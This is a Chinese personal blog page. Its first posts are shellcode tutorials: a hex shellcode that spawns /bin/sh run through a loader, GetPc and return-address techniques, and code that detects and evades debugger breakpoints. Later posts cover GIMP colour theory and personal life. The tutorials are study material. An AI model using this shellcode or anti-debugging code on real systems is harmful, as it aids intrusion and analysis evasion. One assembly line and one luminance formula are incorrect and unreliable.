 <span class="special">~</span>/Work/project/blackhat/shellcode  ./loader64 <span class="formula">$(echo -en "<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>48<span class="command">\xbf</span><span class="command">\x</span>6a<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xc</span>1<span class="command">\xef</span><span class="command">\x</span>08<span class="command">\x</span>57<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05")
<span class="special">[</span>reverland@gentoo shellcode<span class="special">]</span>$</span>
</code></pre><p>这个shellcode来自之前启动一个shell的shellcode，注意提示符。</p>
<h2 id="基于返回的载入器">基于返回的载入器</h2><p>基于返回的代码也能用载入器测试，而且更小，不需要分配内存。</p>
<pre><code><span class="label">_start:</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rsp</span> <span class="comment">; rsp现在指向第一个参数</span>
    <span class="keyword">ret</span>
</code></pre><p>只是我觉得，似乎参数位置是不可执行的。关于ROP，以后说吧</p>
<p>最后还有些动态载入和动态socket载入器。当shellcode依赖有漏洞二进制程序上下文时包含一个链接的动态部分，这是啥我现在还不知道。。。。。。</p>
<p>下一篇<a href="http://blackhat.life/Shellcode/Dynamic" target="_blank" rel="external">Dynamic shellcode</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/11/shellcodeenvironment/" itemprop="url">
                  Shellcode/Environment
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-11T00:00:00+08:00" content="2015-03-11">
              2015-03-11
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/11/shellcodeenvironment/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/11/shellcodeenvironment/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>源自：<a href="http://blackhat.life/Shellcode/Environment" target="_blank" rel="external">blackhat.life/Shellcode/Environment</a>，意译，原文是用gas的，我比较喜欢nasm语法。。。。。。</p>
<p>一般汇编文件开头这样写入口：</p>
<pre><code><span class="keyword">global</span> _start
_star<span class="variable">t:</span>
</code></pre><p>然后，比如64位，</p>
<pre><code>nasm <span class="operator">-f</span> elf64 get_pc_64.s
</code></pre><p>最后链接：</p>
<pre><code>ld get_pc_64<span class="class">.o</span> -o get_pc_64
</code></pre><p>可以用gdb来载入查看</p>
<pre><code> ~/Work/project/blackhat/shellcode  gdb -q a.out
Reading symbols from /home/reverland/Work/project/blackhat/shellcode/a.out...(no debugging symbols found)...done.
(gdb) disassemble _start,+<span class="number">10</span>
Dump of assembler code from <span class="number">0x4000b0</span> to <span class="number">0x4000ba</span>:
   <span class="number">0x00000000004000b0</span> &lt;_start+<span class="number">0</span>&gt;:       jmp    <span class="number">0x4000b3</span> &lt;startup&gt;
   <span class="number">0x00000000004000b2</span> &lt;pc+<span class="number">0</span>&gt;:   nop
   <span class="number">0x00000000004000b3</span> &lt;startup+<span class="number">0</span>&gt;:      lea    rax,[rip+<span class="number">0xfffffffffffffff8</span>]        <span class="preprocessor"># <span class="number">0x4000b2</span> &lt;pc&gt;</span>
End of assembler dump.
</code></pre><p>不过只是为了看汇编效果的话，不用链接直接看就是</p>
<pre><code>~ objdump -d -M intel last_call_32<span class="class">.o</span>
last_call_32<span class="class">.o</span>:     file format elf32-i386

Disassembly of <span class="tag">section</span> <span class="class">.text</span>:

<span class="number">00000000</span> &lt;_start&gt;:
   <span class="number">0</span>:   <span class="number">8</span>b <span class="number">44</span> <span class="number">24</span> fc             mov    eax,DWORD PTR [esp-<span class="number">0</span>x4]
</code></pre><p>另外<code>ndisasm</code>和<code>rasm2</code>用不顺手，怎么和我想得到的结果不一样= =</p>
<p>好了，废话完了，正文。</p>
<hr>
<p>shellcode能在当前环境下，探测指令集架构，程序指针，上一个返回的地址，或者绕过和探测int3断点。</p>
<h2 id="探测指令集架构">探测指令集架构</h2><p><a href="http://phrack.org/issues/57/17.html" target="_blank" rel="external">Architecture Spanning Shellcode</a></p>
<h2 id="GetPc">GetPc</h2><p>GetPc是用来获得当前指令指针的技术。如果写自修改shellcode这个挺游泳，或者对那些必须知道自己所处环境的shellcode，因为环境信息在代码执行前不可预知。</p>
<h3 id="x86">x86</h3><p>call会把下一行地址压栈</p>
<pre><code><span class="keyword">jmp</span> startup
<span class="label">getpc:</span>
   <span class="keyword">mov</span> eax [esp]
   <span class="keyword">ret</span>
<span class="label">startup:</span>
<span class="keyword">call</span> getpc       <span class="comment">; the %eax register now contains %eip on the next line</span>
</code></pre><h3 id="x64">x64</h3><p>同理</p>
<pre><code><span class="keyword">jmp</span> startup
<span class="label">getpc:</span>
   <span class="keyword">mov</span> rax, [rsp]
   <span class="keyword">ret</span>
<span class="label">startup:</span>
<span class="keyword">call</span> getpc       <span class="comment">; the %rax register now contains %rip on the next line </span>
</code></pre><p>或者x64可以直接操作rip</p>
<pre><code><span class="keyword">jmp</span> startup
<span class="label">pc:</span>
  <span class="keyword">nop</span>
<span class="label">startup:</span>
  <span class="keyword">lea</span> <span class="literal">rax</span>, [<span class="preprocessor">rel</span> pc]  <span class="comment">; the %rax register now contains the address of `pc'.</span>
</code></pre><h2 id="上次调用返回地址">上次调用返回地址</h2><p>一般情况下，在缓冲区溢出攻击中执行shellcode，假设nop sled没有改变堆栈，函数的返回地址是<code>[rsp-0x8]</code>或者<code>[esp-0x4]</code>，就是在溢出过程中覆盖的掉那个堆栈返回的地址。很多情况下，这能在写多态shellcode时替代GetPc. alphanumeric last call在64位系统中有13字节。</p>
<h3 id="32位">32位</h3><p>Null-free的shellcode(没有<code>\x00</code>)</p>
<pre><code><span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">esp</span>-<span class="number">0x4</span>]
</code></pre><h3 id="64位">64位</h3><p>Null-free</p>
<pre><code><span class="keyword">mov</span> [<span class="literal">rax</span>], [<span class="literal">rsp</span>-<span class="number">0x8</span>]
</code></pre><h2 id="int3断点">int3断点</h2><p>int3断点可以被探测出来。</p>
<pre><code><span class="built_in">global</span> _start
<span class="label">_start:</span>
<span class="keyword">jmp</span> startup
<span class="label">
go_retro:</span>
<span class="keyword">pop</span> <span class="literal">rcx</span>
<span class="keyword">inc</span> <span class="literal">rcx</span>
<span class="keyword">jmp</span> [<span class="literal">rcx</span>]
<span class="label">
startup:</span>
<span class="keyword">call</span> go_retro
<span class="label">
volatile_segment:</span>
<span class="keyword">push</span> <span class="number">0x3458686a</span>
<span class="keyword">push</span> <span class="number">0x0975c084</span>
<span class="keyword">nop</span>
</code></pre><p>关键的代码在</p>
<pre><code><span class="keyword">push</span> <span class="number">0x3458686a</span>
<span class="keyword">push</span> <span class="number">0x0975c084</span>
</code></pre><p>这是啥呢？</p>
<pre><code> ~/Work/project/blackhat/shellcode  rasm2 -d <span class="string">"6a6858346885c07509"</span>
<span class="keyword">push</span> <span class="number">0x68</span>
<span class="keyword">pop</span> <span class="literal">eax</span>
<span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x68</span>
<span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="keyword">jne</span> <span class="number">0x12</span>
</code></pre><p>当在第二个push加断点时，会把上一个字节暂改为<code>\xcc</code></p>
<pre><code><span class="number">000000000000000</span>d &lt;volatile_segment&gt;:
   d:   <span class="number">68</span> <span class="number">6</span>a <span class="number">68</span> <span class="number">58</span> cc          push   <span class="number">0xcc58686a</span>
  <span class="number">12</span>:   <span class="number">68</span> <span class="number">84</span> c0 <span class="number">75</span> <span class="number">09</span>          push   <span class="number">0x975c084</span>
  <span class="number">17</span>:   <span class="number">90</span>                      nop
</code></pre><p>这时，推到栈上的就是：</p>
<pre><code> ~/Work/project/blackhat/shellcode  rasm2 -d <span class="string">"6a685834cc85c07509"</span>
<span class="keyword">push</span> <span class="number">0x68</span>
<span class="keyword">pop</span> <span class="literal">eax</span>
<span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0xffffffcc</span>
<span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="keyword">jne</span> <span class="number">0x12</span>
</code></pre><p>这样就会向前跳0x12而不是激发断点。</p>
<p>我们可以试试，下次再写loader，所以。。。</p>
<pre><code> ~/Work/project/blackhat/shellcode  gdb -q detect_breakpoint
Reading symbols from /home/lyy/Work/project/blackhat/shellcode/detect_breakpoint...(no debugging symbols found)..<span class="string">.done</span>.
(gdb) disassemble _start,+<span class="number">20</span>
Dump of assembler code from <span class="number">0x4000b0</span> to <span class="number">0x4000c4</span>:
   <span class="number">0x00000000004000b0</span> &lt;_start+<span class="number">0</span>&gt;:       <span class="keyword">jmp</span>    <span class="number">0x4000b8</span> &lt;startup&gt;
   <span class="number">0x00000000004000b2</span> &lt;go_retro+<span class="number">0</span>&gt;:     <span class="keyword">pop</span>    <span class="literal">rcx</span>
   <span class="number">0x00000000004000b3</span> &lt;go_retro+<span class="number">1</span>&gt;:     <span class="keyword">inc</span>    <span class="literal">rcx</span>
   <span class="number">0x00000000004000b6</span> &lt;go_retro+<span class="number">4</span>&gt;:     <span class="keyword">jmp</span>    <span class="preprocessor">QWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">rcx</span>]
   <span class="number">0x00000000004000b8</span> &lt;startup+<span class="number">0</span>&gt;:      <span class="keyword">call</span>   <span class="number">0x4000b2</span> &lt;go_retro&gt;
   <span class="number">0x00000000004000bd</span> &lt;volatile_segment+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x3458686a</span>
   <span class="number">0x00000000004000c2</span> &lt;volatile_segment+<span class="number">5</span>&gt;:     <span class="keyword">push</span>   <span class="number">0x975c084</span>
End of assembler dump.
(gdb) b *<span class="number">0x00000000004000c2</span>
Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x4000c2</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/shellcode/detect_breakpoint 
<span class="label">warning:</span> no loadable sections found <span class="keyword">in</span> added symbol-file system-supplied DSO <span class="preprocessor">at</span> <span class="number">0x7ffff7ffd000</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="number">0x00000000004000b6</span> <span class="keyword">in</span> go_retro ()
(gdb) 
</code></pre><p>没有碰到断点！！(那啥sigsegv了，看样子shellcode loader应该先写。。。)</p>
<p>ps: 这让我想起来之前反gdb调试的一些学习，下次再写吧</p>
<h2 id="跑题的吐槽">跑题的吐槽</h2><p>作为一个什么都会点什么都不会的渣，也被推到投简历找实习的浪潮之中，立马被北邮的互联网求职氛围吓尿了，看到<a href="http://yanyiwu.com/work/2015/03/06/programmer-in-school.html" target="_blank" rel="external">bswgd在《谈谈在校程序员技能培养》</a>中谈到：</p>
<blockquote>
<p>几乎是从事互联网行业的人都知道，北邮人找互联网的工作特别拿手。 甚至被说成如蝗虫过境一般。事实却是也是如此。</p>
</blockquote>
<p>往身边看看，真是这感觉。。。</p>
<p>看了<a href="http://lilydjwg.is-programmer.com/posts/58837.html" target="_blank" rel="external">依云仙子的《再三错过》</a>中心理好难过，阴影一直如影随形。</p>
<p>于是在大家都投完简历我还是拖延着什么也没写，只是把仙子当年的感慨找来看了看。</p>
<p>至于我自己，还是趁着没毕业多调查下吧</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/art/2015/03/09/" itemprop="url">
                  谈谈色彩空间和混合模式
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-09T00:00:00+08:00" content="2015-03-09">
              2015-03-09
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/art/" itemprop="url" rel="index">
                    <span itemprop="name">art</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/art/2015/03/09/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="art/2015/03/09//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>图层模式和色彩空间理论，在寒假的时候就很好奇，找来gimp的文档看了看图层模式还是有些糊里糊涂。关于色彩理论，看到图像处理新闻组(好像很古老的东西了)上推荐这篇文章<a href="http://www.poynton.com/ColorFAQ.html" target="_blank" rel="external">Color FAQ</a>，看上去似乎很不错的样子，但好像不适合入门。</p>
<p>后来看到一本1996年关于gimp的书<a href="http://gimp-savvy.com/BOOK/index.html?node52.html" target="_blank" rel="external">Grokking the GIMP</a>，虽然似乎有些古老的样子，但一目了然，很多东西，十年都未曾变化。</p>
<h2 id="色彩基础">色彩基础</h2><h3 id="RGB空间">RGB空间</h3><p>即通过Red、Green、Blue来表示其它颜色的方法。每种颜色都取0-255之间的值。这样整个色彩空间可以表示在R、G、B为轴的立方体内。</p>
<p>一般看来，越往对角线方向色彩感觉越亮。</p>
<h3 id="HSV空间">HSV空间</h3><p>这里有几个定义：</p>
<p>lightness：L = (MAX(R, G, B) + MIN(R, G, B))/2<br>value: V = MAX(R, G, B)<br>luminance: Y = 0.30R + 0.69G + 0.11B<br>brightness: (R + G + B)/3</p>
<p>luminance更符合人的主观亮度感受。brightness和人的感受差别较大，一般不用而用luminance。</p>
<p>那HSV模型在RGB空间是什么样的呢。</p>
<h3 id="HSV和RGB关系">HSV和RGB关系</h3><p>在RGB空间所在的立方体中，主对角线被成为Neutral line。这条线从原点到(255,255,255)逐渐从黑色过度到灰色到更浅的灰色到白色。</p>
<p>HSV中固定H，则获得过这条线的一面。固定S，则获得以此为轴原点为顶点的圆锥面。固定V，则获得关于此线垂直的面。</p>
<h3 id="CMYK减法模型">CMYK减法模型</h3><p>这是印刷中常用的，RGB用在发光模型中，CMY(K)用在反光模型中。k应该不超过MAX(C, M, Y)</p>
<h3 id="转换为灰度图像">转换为灰度图像</h3><p>有三种方法：</p>
<ol>
<li>Grayscale: 通过计算luminance，这个符合人眼对亮度的感觉</li>
<li>Desaturate: 计算lightness。实际上保留了RGB分量</li>
<li>Decompose HSV:抽取HSV中的V</li>
</ol>
<p>V &gt; L或Y，所以显然V最亮，但人眼会感觉Grayscale效果最好。所以后两种方法常用在分离图像上。</p>
<h2 id="图层模式">图层模式</h2><p>这是关于两个或多个图层的故事，上面的记为F，下面的记为B</p>
<h3 id="Normal,_Dissolve,_Behind模式">Normal, Dissolve, Behind模式</h3><p>Normal没啥特别的，溶解和F图层的透明度有关，透明度越大，B透过的越多。</p>
<p>behind是个特殊的画笔才能用的模式，就像在玻璃背面画图一样</p>
<h3 id="Addition，Substract，_Difference模式">Addition，Substract， Difference模式</h3><p>运算符号表示各个分量独立运算。W为白色</p>
<p>加法：<br>    R = min(F + B, W)</p>
<p>减法：<br>    R = max(B - F, 0)</p>
<p>差分：<br>    R = |F - B|</p>
<p>前两种方法可能会造车个部分额区域变得全白或全黑，丢失部分信息。</p>
<h3 id="multiply(burn),_Divide(Dodge),_Screen,_Overlay模式">multiply(burn), Divide(Dodge), Screen, Overlay模式</h3><p>发现变化也不少，现在又是hard light又是啥的，burn也不是multiply，Divide也不是Dodge了。不过也差不多，burn和dodge只是把相应multiply和divide的F反色了(255-F)</p>
<p>正片叠底：<br>    R = (F x B)/255</p>
<p>得到的结果比F和B都暗</p>
<p>除法：<br>    R = MIN(W, B x 256 / (F + 1))</p>
<p>结果比B亮，有可能变白丢失信息</p>
<p>滤色：<br>    R = 255 - 1/255 x (255- F) x (255 - B)</p>
<p>滤色原理和乘法类似，只是是从W开始向原点计算。结果是图像所有地方都变亮，但并不会出现某些区域全变白色丢失信息。</p>
<p>叠加(不过gimp中的叠加好像就是柔光, <a href="https://bugzilla.gnome.org/show_bug.cgi?id=162395" target="_blank" rel="external">这里看起来让人困惑</a>)：<br>    multiply和screen的结合：<br>    R = 1/255 x (B x R_S + (255 - B) X R_m)</p>
<p>如果先面的图层B很深，就以multiply为主，相反如果B很亮，则以screen为主。结果就是暗的地方更暗，亮的地方更亮。</p>
<h3 id="Darken_Only_和_Lighten_Only模式">Darken Only 和 Lighten Only模式</h3><p>变暗：<br>    R = MIN(F, B)</p>
<p>变亮：<br>    R = MAX(F, B)</p>
<h3 id="Hue,_Saturation,_Value,_Color模式">Hue, Saturation, Value, Color模式</h3><p>色调：<br>    R = [h(F), s(B), v(B)]</p>
<p>取前景的色调</p>
<p>Value和Saturation类似。</p>
<p>Color：<br>    R = [h(F), s(F), l(B)]</p>
<p>使用背景的lightness，一般lightness都比value小些</p>
<p>最后，这里头什么乱七八糟的历史问题，还是这比较清楚：<a href="http://www.pegtop.net/delphi/articles/blendmodes/" target="_blank" rel="external">图层混合模式详解</a></p>
<h2 id="其它">其它</h2><p>最后，完全被北邮求职氛围吓尿拉！！！！！！！！！！！</p>
<p>惶恐万分，心情只能用下面的图形容</p>
<p><img src="/images/ancious.jpg" alt="惶恐万分图" title="希望手绘反映内心"></p>
<p>还有时间这样没事画棵树么？</p>
<p><img src="/images/work-gimp3.jpg" alt="树" title="我的第一个上色唉"></p>
<p>不管怎样，毕业之前有几件特别想做的事：</p>
<ol>
<li>以工作室的名义发布一款自任美工、编剧、程序员等balblabla使用phaser.js制作的“网页游戏”</li>
<li>画给某些人的画</li>
<li>去游泳馆洗三百次澡= =。。。。。。</li>
</ol>
<p>as酱上回来找我玩错过了好遗憾，as酱T T，下次你有空不知啥时候了。</p>
<p>最后奉上工作室logo：</p>
<p><img src="/images/work-gimp5.jpg" alt="半条狗工作室" title="半条狗logo"></p>
<p>欢迎各位一起来玩耍。一起来做ARPG啊！</p>
<p>最后丧心病狂大量图片哈哈哈哈</p>
<p>在aus的推荐下迷上了像素画</p>
<p><img src="/images/work-gimp4.jpg" alt="像素狗，半条狗" title="一条大狗">]</p>
<p><img src="/images/work-gimp2.jpg" alt="anubis" title="anubis"></p>
<p>在<a href="http://www.gimpusers.com" target="_blank" rel="external">gimpusers</a>上看到了很多很棒的教程！</p>
<p><img src="/images/work-gimp.jpg" alt="chrome环" title="chrome">]</p>
<p><img src="/images/work-gimp1.jpg" alt="火焰效果" title="fire"></p>
<p><img src="/images/work-gimp6.jpg" alt="flashy car" title="flashy car"></p>
<p><img src="/images/animated-radar.gif" alt="animated radar" title="动画雷达"></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2015/03/02/2015s-first-post/" itemprop="url">
                  2015's First Post
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-02T00:00:00+08:00" content="2015-03-02">
              2015-03-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2015/03/02/2015s-first-post/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/03/02/2015s-first-post/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>好早就想写点什么了，然而犹犹豫豫一直没下笔。一月没有写，二月也没有写，转眼年也过了，三月来了，天气将要转暖，马上要找实习写论文找工作，还有许许多多漫天飞舞不知何去何从的残念。</p>
<p>都快忘记怎么用jekyll的rake新建一个post，怎么使用markdown语法，也迟疑着不知该具体写些什么。</p>
<p>之前的两月没有白过，想说的仅此吧。</p>
<p>游了一个月不到的泳，就第三次把手砸在水线上血染泳池，半夜跑去北医三院打了针破伤风，再游泳就昨天了。</p>
<blockquote>
<p>怎样下水才能表现出经常下水的样子</p>
</blockquote>
<p>跑到深水区救生员小哥说你的装备呢，我才发现什么泳帽泳镜都没拿进去。。。。。。下水后整个人都快动不了了，虚得一塌糊涂。</p>
<p>一个月过年就爬过一次山，算是活动了下。把小伙伴们带到没路的地方，然后强行开路。。。。。。</p>
<p>不扯其它的了。</p>
<p>又做了次LFS，终于明白是在干什么了。然而等所有东西都安装好却懒得去配置了。</p>
<p>玩了下nodeschool系列。把javascripting、learnyounode、git-it、functional-javascript、shader-school、webgl都过了遍。现在还记得些什么呢。。。。。。有道笔记里应该还有些笔记。</p>
<p>于是开始折腾glsl，把shader-school过遍发现难度好大。把中科大黄章进老师的高级计算机图形学的课件拿来看了看，最后也没看多少。</p>
<p>把webgl-workshop过了遍，最后发现<a href="http://www.webglacademy.com/" target="_blank" rel="external">http://www.webglacademy.com/</a>不错却只画了个2D三角形，现在也几乎忘的干净。不过再上手应该就很快了。</p>
<p>查webgl的知识看到<a href="http://html5gamedev.org/" target="_blank" rel="external">http://html5gamedev.org/</a>上webgl的一些效果，再加上一个在线的<a href="http://race.assassinscreedpirates.com/" target="_blank" rel="external">刺客信条游戏</a>便萌生了开发游戏的。。。。。。。呵呵。。。。</p>
<p>然后看到某某的html5游戏引擎制作中设计精灵，竟然开始专注图像处理。。。。。。</p>
<p>学习下基础的图像理论色彩理论等等等，</p>
<p>把gimp和krita重新配置了下。桌面主题和图标折腾了下又回归原来的配色主题，因为好看的主题总会在某些地方让人看不清东西，毕竟好看是次要的。</p>
<p>看到论坛上有人推荐<a href="http://pages.cs.wisc.edu/~remzi/OSTEP/" target="_blank" rel="external"> Operating Systems: Three Easy Pieces </a>，感觉很不错。又看有人推荐<a href="http://littleosbook.github.io/" target="_blank" rel="external">littleOsbook</a>，跟着写了点发现太不详细了，从分段开始我就不知道怎么把一切串到一起。后来看到<a href="http://wiki.osdev.org/Bare_Bones" target="_blank" rel="external">Osdev上的教程</a>，只大致看了看。</p>
<p>发现<a href="http://www.68ps.com/jc/big_ps_tp.asp?id=19958" target="_blank" rel="external">68ps</a>的抠图教程不错，大年三十看着春晚抠图。。。。。。最后也没做好。</p>
<p>照着上面网站另一篇鼠绘教程画了个<a href="http://www.68ps.com/jc/big_ps_sh.asp?id=3044" target="_blank" rel="external">水母</a>。感觉这没有数位板不行啊，于是翻出了尘封多年的绘图板。又把数位板翻出来连上，重新编译内核wacom模块(学会了失传已久的单独模块编译技术…)。</p>
<p>所以，接下来：</p>
<p>准备成立个工作室，做个游戏，发行两个唱片。</p>
<p>先完成工作室logo设计，为此查了一天的anubis。</p>
<p>还顺便在朋友的推荐下学习做做pixel art。在图书馆乱翻到一本什么bibi的photoshop插画私房菜什么的书，竟然也看到里头演示pixel art实例。</p>
<p>把webgl过遍。</p>
<font color="red">好好游泳，锻炼身体。</font>

<p>呵呵呵，还有实验室、论文、实习、工作。。。。。。</p>
<p>渣渣的第一个鼠绘：）</p>
<p><img src="/images/jellyfish.png" alt="照着ps教程用gimp鼠绘的水母" title="照着ps教程用gimp鼠绘的水母"></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/12/24/" itemprop="url">
                  明天太远，今天太短
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-12-24T00:00:00+08:00" content="2014-12-24">
              2014-12-24
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/12/24/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/12/24//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>迷路的鸽子啊。</p>
</blockquote>
<p>一年很短，一年好长。</p>
<p>一年倏忽就晃过去，倏忽间珍存的只在记忆留下余温。</p>
<p>一年的记忆累累，蓊蓊郁郁，如烟似梦，怎么都回忆不完。</p>
<p>觉得变了很多，连早上起来呼吸的空气都变了味道，又觉得什么都没有变，日光之下，并无新事。</p>
<h1 id="算了">算了</h1><p>随便写下，随便回忆下。</p>
<p>几乎每天都去游泳。</p>
<p>春夏秋冬。</p>
<p>寒来暑往。</p>
<p>像一个师妹的话，风雨无阻。</p>
<p>像另一个师妹的话，专情。</p>
<p>如果有什么贯穿始终的话，</p>
<p>游泳是2014年贯穿始终的全部。</p>
<p>我的2014不可磨灭的关键词</p>
<p>三月份之前我不记得了，在家挺不适应，冷，宅。颓得一塌糊涂，唯一似乎做的有意义的事是把python公案给过了遍，twisted的一篇教程和文档看了遍，如今已不记得只言半句。回去过年房间也没收拾，也是遗憾吧。家里变化好大，回去的几天家里漫天白茫茫的雾，所有祥和气氛下的无奈与心酸变故，化作一声叹息，无处寻觅。</p>
<p>年前回家那阵忙着考试，过得忙碌，好久没和家里充分联系。回到家里，我还看着。。。算了，不想多说。</p>
<p>往日祥和一心的氛围一去不返，十几年的情谊一霎那岌岌可危。</p>
<p>这就是2014年的春节寒假。</p>
<p>以前看红楼梦，只是看到里头家人朋友相聚时热闹祥和的气氛深有感触，觉得这些经历跟我没什么关系。当年只是感慨韶华易逝，没想到逝这么快。这才想起来红楼梦中其它种种，都像预言一样，不觉泪下。</p>
<p>开学回学校，似乎有种解脱感。所有种种要面对的问题，都留给独立撑起家里的母亲。</p>
<p>回到学校，工作上也有大变动，地点换了，内容也完全变了。做了些与网络协议相关的工作，不自觉也兴致盎然，饶有兴趣研究了网络层一些协议。</p>
<p>那段日子也算清闲自在，实验室来新师弟师妹了，和室友在实验室打minecraft，在实验室玩xbox推刺客信条和热血无赖，八点钟去游泳池打酱油。</p>
<p>这些日子渐渐和zq、扯旗、彬哥、阿花混得比较熟了，游泳总是碰上，哈哈。不过他们都是在用心游，我就抱着活动活动的心态随便动动。</p>
<p>阿花每次见到我总喜欢拿我开涮，总说，唉，那个是你师姐，唉，又手把手教你师姐不陪我玩。阿花帅气成熟，我这种人能和阿花认识总觉得是生命中的奇迹。阿花曾经在泳池里看到了一个妹子，心生向往之情，在论坛上发帖定向。我之前知道这个人来找过某室友，只寥寥说过几句话。有次在水里听到说到帖子定向的事，我一看，唉，是不是你啊。然后竟然就莫名其妙的熟起来了。那几天一起去学自由泳，游完来碗热腾腾的拉面。后来，阿花和妹子也算搭上谈了谈，终于有缘无份，抱憾而终。有次一起去水立方游泳时，从新奥购物中心巨大的建筑物，来到奥林匹克公园豁然开朗时，阿花轻描淡写但不无遗憾的谈到此事。然而我无法如此坦诚，后来阿花去游泳少了许多，一个是工作忙，一个是职务上的事也多，另外其它事也多。阿花后来喊我去打台球，终于却一次没去一起打过。总之，希望新的一年阿花捉到一只……嗯……妹子。</p>
<p>zq是碧水情深版版主，嘿，真是很少见到这么热情的人。我总是很佩服zq，待人接物，举止言谈都自然坦诚，让人一见了就欢喜。对此，zq的说法是：因为我是个逗比= = zq是我的游泳教练和陪我去看病骑车带我去游泳的好机油，也是我人生的导师。zq教我游泳，开始只有一个理论：不要让自己太舒服，坚持，再坚持一下。在我眼中，zq非常善于与他人交流，总是很虚心地向别人请教各种人生问题。啊，zq好像知道我博客的地址……不多说了。祝愿工作顺利、身体健康、心情愉快！当然，还有妹子哈哈。zq你要看到我想说，你单身纯粹是你自己想单身，随便跟你走几百米能有三四个妹子给打招呼= =</p>
